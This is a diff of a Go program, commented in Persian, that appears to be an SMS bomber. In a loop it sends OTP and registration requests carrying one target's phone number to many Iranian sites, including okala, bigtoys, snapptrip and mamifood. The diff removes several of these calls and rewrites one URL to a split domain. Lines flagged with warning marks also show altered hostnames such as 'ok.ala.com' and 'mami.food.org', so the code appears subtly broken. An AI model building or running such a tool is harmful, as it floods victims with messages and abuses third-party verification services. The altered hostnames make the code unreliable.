@@ -261,38 +261,6 @@ func main() {
 
 	for i := 0; i < repeatCount; i++ {
 
-		// okala.com - OTPRegister (JSON)
-		wg.Add(1)
-		tasks <- func() {
-			sendJSONRequest(ctx, "https://apigateway.ok.ala.com/api/voyager/C/CustomerAccount/OTPRegister", map[string]interface{}{
-				"mobile":                     phone,
-				"confirmTerms":               true,
-				"notRobot":                   false,
-				"ValidationCodeCreateReason": 5,
-				"OtpApp":                     0,
-				"IsAppOnly":                  false,
-				"deviceTypeCode":             7,
-				// سایر فیلدهای موجود در Payload اصلی را می‌توانید اینجا اضافه کنید اگر نیاز باشد
-			}, &wg, ch)//⚠️
-		}
-
-		// okala.com - SaveUserInfo (JSON)
-		wg.Add(1)
-		tasks <- func() {
-			// توجه: UserAttributes یک آرایه پیچیده است. فرض بر این است که این ساختار ثابت است
-			// و فقط شماره تلفن در آن داینامیک می‌شود.
-			// اگر این ساختار نیاز به تولید داینامیک یا اطلاعات دیگر دارد، ممکن است نیاز به تغییرات بیشتری باشد.
-			sendJSONRequest(ctx, "https://apigateway.okala.com/api/voyager/C/CustomerAccount/SaveUserInfo", map[string]interface{}{
-				"mobileNumber": phone,
-				"UserAttributes": []map[string]interface{}{
-					{"key": "phone", "value": phone},
-					{"key": "user_id", "value": nil},
-					// سایر المان‌های آرایه UserAttributes را در صورت نیاز اضافه کنید
-				},
-				"userMetrixId": "5fdc65ee-966f-4712-9a68-73381054398f", // این مقدار ممکن است داینامیک باشد و نیاز به بررسی دارد
-			}, &wg, ch)
-		}
-
 		// livarfars.ir (Form)
 		wg.Add(1)
 		tasks <- func() {
@@ -311,29 +279,6 @@ func main() {
 			formData.Set("_wp_http_referer", "/?login=true&page=2&redirect_to=https%3A%2F%2Flivarfars.ir%2F")       // ممکن است نیاز به URL Encode داشته باشد و داینامیک باشد
 			sendFormRequest(ctx, "https://livarfars.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
 		}
-
-		// bigtoys.ir - Variation 1 (Form)
-		wg.Add(1)
-		tasks <- func() {
-			formData := url.Values{}
-			formData.Set("action_type", "phone")
-			formData.Set("digt_countrycode", "+98")
-			formData.Set("phone", strings.TrimPrefix(phone, "0")) // اغلب این وبسرویس ها شماره را بدون صفر اول میخواهند
-			formData.Set("email", "")
-			formData.Set("digits_reg_name", "abcdefghl")
-			formData.Set("digits_reg_password", "qzF8w7UAZusAJdg") // این مقدار ممکن است نیاز به تولید داینامیک داشته باشد
-			formData.Set("digits_process_register", "1")
-			formData.Set("instance_id", "a1512cc9b4a4d1f6219e3e2392fb9222") // این مقدار ممکن است داینامیک باشد
-			formData.Set("optional_data", "optional_data")
-			formData.Set("action", "digits_forms_ajax")
-			formData.Set("type", "register")
-			formData.Set("dig_otp", "")
-			formData.Set("digits", "1")
-			formData.Set("digits_redirect_page", "//www.bigtoys.ir/") // ممکن است نیاز به URL Encode داشته باشد
-			formData.Set("digits_form", "3bed3c0f10")                // این مقدار ممکن است داینامیک باشد
-			formData.Set("_wp_http_referer", "/")
-			sendFormRequest(ctx, "https://www.big.toys.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
-		}//⚠️
 
 		// bigtoys.ir - Variation 2 (Form)
 		wg.Add(1)
@@ -357,8 +302,8 @@ func main() {
 			formData.Set("digits_redirect_page", "//www.bigtoys.ir/") // ممکن است نیاز به URL Encode داشته باشد
 			formData.Set("digits_form", "3bed3c0f10")                // این مقدار ممکن است داینامیک باشد
 			formData.Set("_wp_http_referer", "/")
-			sendFormRequest(ctx, "https://www.bigtoys.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
-		}
+			sendFormRequest(ctx, "https://www.big.toys.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
+		}//⚠️
 
 		// bigtoys.ir - Variation 3 (Form)
 		wg.Add(1)
@@ -486,22 +431,6 @@ func main() {
 			}, &wg, ch)
 		}
 
-		// platform-api.snapptrip.com - inquiry (JSON)
-		wg.Add(1)
-		tasks <- func() {
-			sendJSONRequest(ctx, "https://platform-api.snapptrip.com/profile/auth/inquiry", map[string]interface{}{
-				"phoneNumber": phone,
-			}, &wg, ch)
-		}
-
-		// platform-api.snapptrip.com - request-otp (JSON)
-		wg.Add(1)
-		tasks <- func() {
-			sendJSONRequest(ctx, "https://platform-api.snapp.trip.com/profile/auth/request-otp", map[string]interface{}{
-				"phoneNumber": phone,
-			}, &wg, ch)//⚠️
-		}
-
 		// backend.digify.shop (JSON)
 		wg.Add(1)
 		tasks <- func() {
@@ -526,25 +455,6 @@ func main() {
 			formData.Set("1_username", phone) // نام فیلد شماره تلفن در اینجا 1_username است
 			// formData.Set("0", `[{"message":""},"$K1"]`) // این فیلد به نظر ثابت و مرتبط با پیام است و شاید نیازی به ارسال نداشته باشد
 			sendFormRequest(ctx, "https://www.offch.com/login", formData, &wg, ch)
-		}
-
-		// mamifood.org - IsUserAvailable (JSON)
-		wg.Add(1)
-		tasks <- func() {
-			sendJSONRequest(ctx, "https://mamifood.org/Registration.aspx/IsUserAvailable", map[string]interface{}{
-				"cellphone": phone,
-			}, &wg, ch)
-		}
-
-		// mamifood.org - SendValidationCode (JSON)
-		wg.Add(1)
-		tasks <- func() {
-			// توجه: پارامتر "did" در این درخواست وجود دارد و ممکن است داینامیک باشد (مانند Device ID).
-			// اگر این مقدار ثابت نباشد، این درخواست احتمالا کار نخواهد کرد یا نیاز به دریافت did جدید در هر بار دارد.
-			sendJSONRequest(ctx, "https://mami.food.org/Registration.aspx/SendValidationCode", map[string]interface{}{
-				"Phone": phone,
-				"did":   "ecdb7f59-9aee-41f5-b0b1-65cde6bf1791", // این مقدار ممکن است نیاز به تولید داینامیک داشته باشد
-			}, &wg, ch)//⚠️
 		}
 
 		// refahtea.ir (Form)
@@ -636,7 +546,6 @@ func main() {
 
 	}
 
-	// ... (بقیه کدهای main تابع بدون تغییر) ...
 	close(tasks)
 
 	go func() {
